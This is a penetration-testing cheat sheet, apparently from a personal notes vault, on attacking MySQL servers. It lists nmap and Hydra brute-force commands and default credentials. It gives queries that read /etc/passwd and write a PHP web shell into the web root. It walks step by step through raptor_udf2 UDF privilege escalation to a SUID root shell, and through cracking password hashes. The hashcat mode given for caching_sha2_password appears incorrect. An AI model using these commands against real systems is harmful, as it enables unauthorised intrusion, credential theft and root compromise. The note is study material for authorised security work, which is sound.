---
created: 2026-04-04
tags:
  - SQL
  - network_services
  - over_the_network
color: "linear-gradient(45deg, #23d4fd 0%, #3a98f0 50%, #b721ff 100%)"
---
## MySQL

 >**[MySQL](https://en.wikipedia.org/wiki/MySQL)** is an open-source relational database management system (RDBMS) that uses Structured Query Language (SQL) to define, query, and manipulate data. 

- MySQL is the world's most popular open-source RDBMS.
- It follows a classic **client-server model**:
	- **Server daemon (`mysqld`)** listens for incoming connections on TCP port `3306` by default. It handles authentication, parses and executes queries, and interacts with the underlying storage engine (usually [InnoDB](https://en.wikipedia.org/wiki/InnoDB)).
	- **Clients** can be CLI tools like the official [`mysql` client](https://dev.mysql.com/doc/refman/8.4/en/mysql.html) or [`mysqldump`](https://dev.mysql.com/doc/refman/8.4/en/mysqldump.html), applications, ORMs, or scripts.

> [!note] In MySQL, the terms **database** and **schema** are synonymous and used interchangeably.

>[!interesting]+ MariaDB
>[MariaDB](https://en.wikipedia.org/wiki/MariaDB) is a community-driven fork of MySQL created after Oracle acquired Sun Microsystems.
>Although MariaDB started as a drop‑in replacement, the two systems have diverged significantly to the present moment.

### Default system databases

MySQL ships with several built‑in databases that store metadata, configuration, and system information:

- **`mysql`**
	- The core system database; stores **user accounts** and **authentication data** (including password hashes), **privileges and roles**, **server configuration**, and stored procedures/functions.
	- Access requires elevated privileges.

- **`information_schema`**
	- Read-only metadata database; contains information about:
		- Databases, tables, columns
		- Constraints, triggers, routines
		- Character sets and collations
	- The database itself is accessible to **all users** without special privileges, but each user sees metadata only for those objects they have permissions to access.
	- Available from MySQL 5.0+; required by the SQL standard.

- **`performance_schema`**
	- In-memory database; tracks server performance metrics, including query execution statistics, resource usage, and instrumentation data; used for low-level performance monitoring. 

- **`sys`**
	- A set of views and stored procedures built on top of `performance_schema` and `information_schema`.
	- Aggregates complex performance and status data into human-readable and user-friendly formats; useful for quick health checks and diagnostics.
	- Available from MySQL 5.7+.

### Authentication

Before being granted access to any database objects, a client must prove its identity to the server.

MySQL supports [multiple authentication methods](https://dev.mysql.com/doc/dev/mysql-server/8.4.6/page_protocol_connection_phase_authentication_methods.html), including:

- `mysql_native_password` (default before MySQL 8.0)
	- Stores usernames and SHA-1-hashed passwords in `mysql.user` table.
	- SHA-1 is cryptographically broken and susceptible to rainbow table attacks.
	- Still common on older Linux servers.

- `caching_sha2_password` (default from MySQL 8.0+)
	- Stores passwords hashed with SHA-256 algorithm.
	- More resistant to brute-force attacks (but still possible to crack).

- **`auth_socket`**
	- Unix socket authentication (local connections only).
	- No password required for local connections.
	- If an attacker gains shell access to the database server, they can connect as any user without a password.

- `pam_authentication`
	- Integrates with Linux PAM (Pluggable Authentication Modules).
	- Delegates authentication to system-level mechanisms.

>[!note] MySQL also supports LDAP, Kerberos, FIDO/WebAuth authentication, and custom authentication plugins. 

## Enumeration

### Nmap scanning

- Check default MySQL port and run version scan:

```bash
sudo nmap -sV -p 3306 <target>
```

> [!tip]+
> - Basic port scanning + version detection — in case you suspect non-standard ports:
> 
> ```bash
> sudo nmap -sV -p- <target>
> ```

- Version detection + default MySQL scripts:

```bash
nmap -p 3306 -sV -sC <target_ip>
```

- Run all MySQL scripts:

```bash
nmap -sV --script mysql-* -p 3306 <target_ip>
```

- Nmap scripts:

| Script                                                                              | Categories                  | Description                                                                                                                                                                                                                              | Requires authentication? |
| ----------------------------------------------------------------------------------- | --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| [`mysql-empty-password`](https://nmap.org/nsedoc/scripts/mysql-empty-password.html) | `intrusive`, `auth`         | Checks for empty passwords for `root` or `anonymous`.<br>No authentication required.                                                                                                                                                     | ❌                        |
| [`mysql-brute`](https://nmap.org/nsedoc/scripts/mysql-brute.html)                   | `intrusive`, `brute`        | Performs credential brute-force; uses `userdb` and `passdb` wordlists.<br>No authentication required.                                                                                                                                    | ❌                        |
| [`mysql-enum`](https://nmap.org/nsedoc/scripts/mysql-enum.html)                     | `intrusive`, `brute`        | Enumerates valid users on MySQL server.<br>No authentication required.                                                                                                                                                                   | ❌                        |
| [`mysql-databases`](https://nmap.org/nsedoc/scripts/mysql-databases.html)           | `discovery`, `intrusive`    | Attempts to list all databases on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | ✅                        |
| [`mysql-dump-hashes`](https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html)       | `auth`, `discovery`, `safe` | Dumps the password hashes from an MySQL server (in a format suitable for cracking with tools like JohnTheRipper). <br>`root` privileges are required.<br>Requires valid MySQL credentials; `root` privileges (`SELECT` on `mysql.user`). | ✅                        |
| [`mysql-variables`](https://nmap.org/nsedoc/scripts/mysql-variables.html)           | `discovery`, `intrusive`    | Attempts to show all variables on a MySQL server.<br>Requires valid MySQL credentials (`SHOW DATABASES` privileges).                                                                                                                     | ✅                        |
| [`mysql-query`](https://nmap.org/nsedoc/scripts/mysql-query.html)                   | `auth`, `discovery`, `safe` | Runs a query against a MySQL database and returns the results as a table.<br>Requires valid MySQL credentials.                                                                                                                           | ✅                        |
**No authentication required:**

- `mysql-empty-password`: Check for empty `root` password:

```bash
nmap -p 3306 --script mysql-empty-password <target>
```

- `mysql-enum`: Enumerate valid MySQL users:

```bash
nmap -p 3306 --script mysql-enum <target>
```

- `mysql-brute`: Check for weak passwords:

```bash
nmap -p 3306 --script mysql-brute <target>
```

```bash
# custom wordlist
nmap -p 3306 --script mysql-brute \
--script-args userdb=users.txt,passdb=passes.txt <target>
```

**Authentication required:**

- `mysql-databases`: Attempts to list databases on a MySQL server:

```bash
nmap -p 3306 --script mysql-databases --script-args mysqluser=root,mysqlpass=password <target_ip>
```

- `mysql-variables`: Inspect MySQL configuration:

```bash
nmap -p 3306 --script mysql-variables --script-args mysqluser=root,mysqlpass=password <target_ip>
```

- `mysql-dump-hashes`: Dump password hashes (requires authentication and high privileges, usually `root`):

```bash
nmap -p 3306 --script mysql-dump-hashes --script-args='username=root,password=password' <target_ip>
```

- `mysql-query`: Execute an arbitrary query on the server:

```bash
nmap -p 3306 --script mysql-query \
--script-args mysqluser=root,mysqlpass=password,query="SELECT user,host FROM mysql.user" <target_ip>
```

### Banner grabbing

- Connect using Netcat:

```bash
nc -vn <target> 3306
```

- Or Telnet:

```bash
telnet <target> 3306
```


## Connecting to MySQL

### `mysql` client

- Connect with no password:

```bash
mysql -h <target> -u <username>
```

>[!note] If you don't specify the host, `mysql` falls back to `localhost`.

- Connect with username and password:

```bash
mysql -h <target> -u <username> -p<password> 
```

>[!note] There shouldn't be a space between `-p` and the password.

- Interactive password prompt:

```bash
mysql -h <target> -u <username> -p
```

>[!tip]+
> - Common default credentials to try (see [`SecLists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt)):
> 
> ```bash
> root:mysql
> root:root
> root:chippc
> admin:admin
> root:
> root:nagiosxi
> root:usbw
> cloudera:cloudera
> root:cloudera
> root:moves
> moves:moves
> root:testpw
> root:p@ck3tf3nc3
> mcUser:medocheck123
> root:mktt
> root:123
> dbuser:123
> asteriskuser:amp109
> asteriskuser:eLaStIx.asteriskuser.2oo7
> root:raspberry
> root:openauditrootuserpassword
> root:vagrant
> root:123qweASD#
> ```

- Specify a custom port (default is `3306`):

```bash
mysql -h <target> -P <port> -u <username> -p<password>
```

- Connect to a specific database:

```bash
mysql -h <target> -u <username> <database_name>
```

- Connect without selecting a database:

```bash
mysql -u username -h <target> -p --skip-database
```

- Connect and execute a query:

```bash
mysql -h <target> -u username -p -e "SELECT @@version;"
```

- Check if TLS is enabled:

```bash
mysql -h <target> -u <username> -p --ssl-mode=REQUIRED
```

- Skip TLS/SSL:

```bash
mysql -h <target> -u <username> -p --skip-ssl
```

- Attempt a Unix socket connection (local only):

```bash
mysql -u <username> -S /var/run/mysqld/mysqld.sock
```

## Brute-forcing credentials

Dictionary attacks with Hydra:

- Password brute-force for one user (`root`):

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>
```

- Password brute-force for multiple users:

```bash
hydra -L users.txt -P passwords.txt mysql://<target>
```

- Specify a custom port:

```bash
hydra -l root -P passwords.txt -s 3307 mysql://<target>
```

- Specify the number of threads to use:

```bash
hydra -l root -P passwords.txt -t 4 mysql://<target>
```

> [!note] MySQL has no built-in account lockout by default, but some hardened configurations or connection plugins may block repeated failures. Keep thread count low (`-t 4`) on engagements to avoid noise.

>[!note] See [[Password wordlists and default credentials]].
## MySQL enumeration

### Version and server information

| Command                             | Description                                                            |
| ----------------------------------- | ---------------------------------------------------------------------- |
| `SELECT @@version;`                 | MySQL/MariaDB server version.                                          |
| `SELECT VERSION();`                 | Server version (function form).                                        |
| `SELECT @@global.version;`          | Global server version variable.                                        |
| `@@innodb_version;`                 | [InnoDB](https://en.wikipedia.org/wiki/InnoDB) storage engine version. |
| `SELECT @@version_compile_os;`      | The OS used to compile the server.                                     |
| `SELECT @@version_compile_machine;` | The CPU architecture used for compilation.                             |
| `SHOW VARIABLES LIKE "%version%";`  | Search for version-related server variables.                           |

- Query multiple variables at once:

```SQL
SELECT 
    @@version AS 'MySQL Version',
    @@version_comment AS 'Version Comment',
    @@version_compile_os AS 'OS',
    @@version_compile_machine AS 'Architecture',
    @@innodb_version AS 'InnoDB Version',
    @@character_set_server AS 'Character Set',
    @@collation_server AS 'Collation';
```

### Databases 

| Command                                                | Description                                                      |
| ------------------------------------------------------ | ---------------------------------------------------------------- |
| `SHOW DATABASES;`                                      | List all databases visible to the current user.                  |
| `SELECT schema_name FROM information_schema.SCHEMATA;` | List all databases using `information_schema` (metadata tables). |
| `SELECT DATABASE();`                                   | Show the currently selected database.                            |
| `USE users;`                                           | Switches to a specific database.                                 |

- Calculate database size in MB:

```SQL
SELECT
	table_schema AS 'Database',
	ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.TABLES
GROUP BY table_schema;
```

- Count tables per database:

```SQL
SELECT table_schema, COUNT(*) FROM information_schema.tables GROUP BY table_schema;
```

### Tables and columns


| Command                                                                                   | Description                                                           |
| ----------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| `SHOW TABLES;`                                                                            | List tables in the current database.                                  |
| `SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE()`          | List tables using `information_schema` (metadata tables).             |
| `DESCRIBE table_name;`                                                                    | Show table structure and column definitions.                          |
| `SHOW COLUMNS FROM table_name;`                                                           | List columns in a table.                                              |
| `SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';` | List columns in a table using `information_schema` (metadata tables). |

- Find sensitive columns:

```SQL
SELECT table_name, column_name FROM information_schema.COLUMNS  
WHERE column_name LIKE '%password%'
	OR column_name LIKE '%pass%'
	OR column_name LIKE '%pwd%'
	OR column_name LIKE '%secret%'
	OR column_name LIKE '%token%'
```

- Count rows for all tables in the current database:

```SQL
SELECT table_name, table_rows FROM information_schema.TABLES WHERE table_schema = DATABASE();
```
### Users

| Command                             | Description                                           |
| ----------------------------------- | ----------------------------------------------------- |
| `SELECT USER();`                    | Show currently authenticated user (may include host). |
| `SELECT CURRENT_USER();`            | Show current user.                                    |
| `SELECT user,host FROM mysql.user;` | List MySQL accounts and their host restrictions.      |
### Privileges

| Command                                                                             | Description                                                                       |
| ----------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| `SHOW GRANTS;`                                                                      | Show privileges for the current user.                                             |
| `SHOW GRANTS FOR 'username'@'host';`                                                | Show privileges for a specific user.                                              |
| `SELECT * FROM information_schema.user_privileges WHERE grantee LIKE '%username%';` | Show privileges for a specific user using `information_schema` (metadata tables). |
| `SELECT grantee, privilege_type FROM information_schema.user_privileges`            | List privileges for all users using `information_schema` (metadata tables).       |
| `SELECT user, host FROM mysql.user WHERE File_priv = 'Y';`                          | List users with the `FILE` privilege.                                             |
| `SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';`                         | List users with the `SUPER` privilege.                                            |
| `SELECT super_priv FROM mysql.user WHERE user="username"`                           | Check if the user has superuser privileges.                                       |
>[!note] `Y` in the response means `YES`.

- Display key privilege flags for all users:

```SQL
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv,  
Create_priv, Drop_priv, File_priv, Super_priv  
FROM mysql.user;
```

### Configuration and system variables

| Command                                         | Description                                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `SHOW VARIABLES;`                               | List all server configuration variables.                                                                                                 |
| `SHOW VARIABLES LIKE 'secure_file_priv';`       | Show the file operations directory (where MySQL can read files using `LOAD DATA INFILE` or write files using `SELECT ... INTO OUTFILE`). |
| `SHOW VARIABLES LIKE 'plugin_dir';`             | Show the plugin directory (where MySQL can load functions from).                                                                         |
| `SHOW VARIABLES LIKE 'datadir';`                | Show the data directory (where MySQL stores databases, tables, log files, and other critical server data).                               |
| `SHOW VARIABLES LIKE 'basedir';`                | Show the base directory (path to the MySQL installation directory).                                                                      |
| `SHOW VARIABLES LIKE 'local_infile';`           | Check if `local_infile` is enabled (controls te ability to use `LOAD DATA LOCAL INFILE`).                                                |
| `SHOW PROCESSLIST;`                             | Display process list (information about the threads currently executing within the MySQL server).                                        |
| `SELECT * FROM information_schema.PROCESSLIST;` | Display process list using `information_schema` (metadata tables).                                                                       |

## File system operations

### secure_file_priv

>[!important] You can read or write files from MySQL only if the `secure_file_priv` variable is not `NULL`.

- Check the `secure_file_priv` variable:

```SQL
SELECT @@secure_file_priv;
```

```SQL
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

- Possible values:
	- `NULL`: File operations are completely disabled (most secure, default in MySQL 8.0+).
	- `''` (empty string): No restrictions — any file the MySQL process can read is accessible (insecure; default in MySQL 5.5 and earlier).
	- Specific directory path (e.g., `/var/lib/mysql-files`): Read/write allowed only within that specific directory.

>[!important] To perform file operations, your user must have the `FILE` privilege.

- Show privileges for the current user:

```sql
SHOW GRANTS;
```

### Reading local files


> **`LOAD_FILE()`** is a MySQL built-in string function that reads the contents of a file from the server's local filesystem and returns it as a string, or `NULL` if the file can't be read.

- Read `/etc/passwd`:

```SQL
SELECT LOAD_FILE('/etc/passwd')
```


- The file must be located on the **same host where MySQL server is running** (only local files), and the **full path** must be specified.
- The file must be readable by the MySQL process user (or by all users).
- File location must satisfy the `secure_file_priv` restriction.
- File size must be less than `max_allowed_packet`.


>[!note]+ `max_allowed_packet`
>- Check `max_allowed_packet`:
>```SQL
>SHOW VARIABLES LIKE '%max_allowed_packet%';
>```
 The file contents is returned as a string value in query results. If the file does not exist or cannot be read because one of the preceding conditions is not satisfied, the function returns `NULL`.


- There's also a [`LOAD DATA`](https://dev.mysql.com/doc/refman/8.4/en/load-data.html), which imports file contents into table rows rather than returning them directly:

```sql
-- Load /etc/passwd into a table row by row
CREATE TABLE loot (line TEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE loot;
SELECT * FROM loot;
```

- The database user you're running as must have the `FILE` privilege.
- MySQL process user (typically `mysql`) must have read permissions on the file.
- File location must satisfy `secure_file_priv` restriction.

>[!important] `LOAD_FILE()` returns file contents as a query result; `LOAD DATA` populates table rows with file contents.

> [!note] There's also a `LOAD DATA LOCAL INFILE` variant that reads from the _client's_ filesystem rather than the server's. This is controlled by the `local_infile` variable and is a separate attack surface — particularly relevant in SQL injection scenarios where you're acting as the client.

>[!tip]+ 
>- [`FROM_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_from-base64) takes a Base64-encoded string and returns the recorded results as a binary string.
>- [`TO_BASE64()`](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html#function_to-base64) is a reverse operation: it takes a string to Base64-encoded form and returns the result.
### Writing files

> **[`SELECT ... INTO OUTFILE`](https://dev.mysql.com/doc/refman/8.4/en/select-into.html) ** is a MySQL statement extension that writes the result set of a `SELECT` query into a file on the server's filesystem, with fields and rows delimited by configurable separators.

> **`SELECT ... INTO DUMPFILE`** writes the raw, undelimited binary content of a single-row, single-column result set into a file — used when byte-perfect output is required, such as when writing binary payloads.

- Write a basic PHP web shell:

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
```

- Dump content of a table into a file:

```SQL
SELECT * FROM users INTO OUTFILE '/tmp/file.txt'
```

>[!important] To perform file operations, your user must have the `FILE` privilege.

- The file is created on the server host.
- The MySQL server process must have **write permissions** on the target directory.
- The MySQL service account (typically `mysql` user on Linux or `SYSTEM` on Windows) determines write access.
- Files created by MySQL are owned by the MySQL process user with umask `0640`.

>[!warning] Writing files is typically strictly reserved for privileged users. 


- Common web roots to try:
	- `/var/www/html/`
	- `/var/www/html/uploads/`
	- `/var/www/`
	- `/usr/share/nginx/html/`
	- `/home/username/public_html/`

- If you were able to upload a file to a web root, you might be able to access it from the website, e.g., via `http://target/shell.php?cmd=whoami`.

## Privilege escalation through User-Defined Functions (UDF)

### UDFs

>A **User-Defined Function (UDF)** in MySQL is a **custom function implemented in native code (C/C++)**, compiled as a **shared library** (`.so` on Linux, `.dll` on Windows), and **loaded into the MySQL server process** at runtime.

- UDFs are **not SQL functions** — they are **native code executed inside `mysqld`**.
- A UDF runs **in-process**, not as a child process.
- If a UDF crashes, MySQL crashes. 

A developer might create a UDF for custom cryptographic functions or specialized math and analytics — and use it just like any built-in MySQL functoin (e.g., `ABS()` or `CONCAT()`). But from an attacker's perspective, UDFs is literally injecting arbitrary C code execution into the database engine.
### Privilege escalation via UDFs

>[!important]+ On MySQL versions and UDF support
> - MySQL UDFs were introduced in MySQL 4.0, and they still exist in MySQL 8.0. However, UDF exploitation is heavily restricted in 8.0+.
> - Most public UDF exploits (including raptor) assume **MySQL ≤ 5.7**.
> 
> In newer versions, the `SUPER` privilege was split, and stricter checks on plugin loading were introduced. That's why exploitation breaks in newer versions — but it doesn't mean it's impossible.

Conditions for UDF exploitation:

- **MySQL ≤ 5.7** (or insecure 8.0 config). Check MySQL version:

```SQL
SELECT @@version;
```

- Your MySQL user has the **`SUPER` privilege**. Check the current user's privileges:

```SQL
SHOW GRANTS;
```

```SQL
SELECT super_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(CURRENT_USER(),'@',1);
```

- Your user has **write access to the directory defined in the `@@plugin_dir` variable** (MySQL UDFs can be loaded only from libraries located there; commonly set to `/usr/lib/mysql/plugin` or `/usr/lib64/mysql/plugin`). Check `@@plugin_dir`:

```SQL
SELECT @@plugin_dir;
```

If you already have established a foothold on the target machine, you can directly put a `.so` file into the MySQL plugin directory. Otherwise, to create a library from within the MySQL process, the `@@secure_file_priv` variable must be either empty or set to the plugin directory:

```SQL
SHOW VARIABLES LIKE 'secure_file_priv';
```

If the above conditions are met, you can achieve command execution on the target server. For this purpose, you can use a popular [`raptor_udf2` exploit](https://www.exploit-db.com/exploits/1518). It provides the `do_system(command)` function that, internally, calls `system()` from libc and therefore turns your SQL string into an OS shell command.  

>[!note] You can think of UDFs as of SQL wrappers around C code, and the `raptor_udf2` exploit is of an SQL wrapper around `system()`.

1. Link and compile the library:

```bash
gcc -g -c raptor_udf2.c -fPIC
```

```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

2. Create a table to store raw binary data for the UDF:

```SQL
CREATE TABLE foo(line BLOB);
```

3. Load the `.so` library from the disk into the table you've created:

```SQL
INSERT INTO foo VALUES (LOAD_FILE('/home/user/tools/mysql-udf/raptor_udf2.so'));
```

MySQL reads the binary `.so` file from disk and stores it as raw bytes inside the table.

4. Copy the `.so` library into the plugin directory:

```SQL
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
```

5. Create a UDF:

```SQL
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
```

This loads `raptor_udf2.so` into memory, looks for `do_system()` inside the code, and registers it as a callable SQL function.

6. List UDFs to check your function is registered:

```SQL
SELECT * FROM mysql.func;
```

7. Execute OS commands:

```SQL
SELECT do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

>[!note]+ **UDFs execute native code with the same OS privileges as the MySQL server.**
> - If MySQL runs as `mysql` -> UDF runs as `mysql`.
> - If MySQL runs as `root` (bad but seen) -> UDF runs as root.
## Cracking password hashes

- Dumping password hashes (requires MySQL `root`):

```SQK
SELECT user, host, authentication_string FROM mysql.user;
```

- `mysql_native_password` (SHA-1):

```
root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
```

```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

- `caching_sha2_password`:

```
root:$A$005$THISISACOMPLEXSALT$... (truncated)
```

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

## References and further reading


- [`MySQL Injection — Payloads All The Things`](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/)
- [`MySQL — Hackviser`](https://hackviser.com/tactics/pentesting/services/mysql)


- [`MySQL LOAD_FILE() function — w3resource`](https://www.w3resource.com/mysql/string-functions/mysql-load_file-function.php)

- [`LOAD_FILE() — MariaDB`](https://mariadb.com/docs/server/reference/sql-functions/string-functions/load_file)

- [`Chapter 6 Adding Functions to MySQL — MySQL Documentation`](https://dev.mysql.com/doc/extending-mysql/8.0/en/adding-functions.html)


- [`MySQL User Defined Functions — Linux Privilege Escalation — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/mysql-user-defined-functions/)


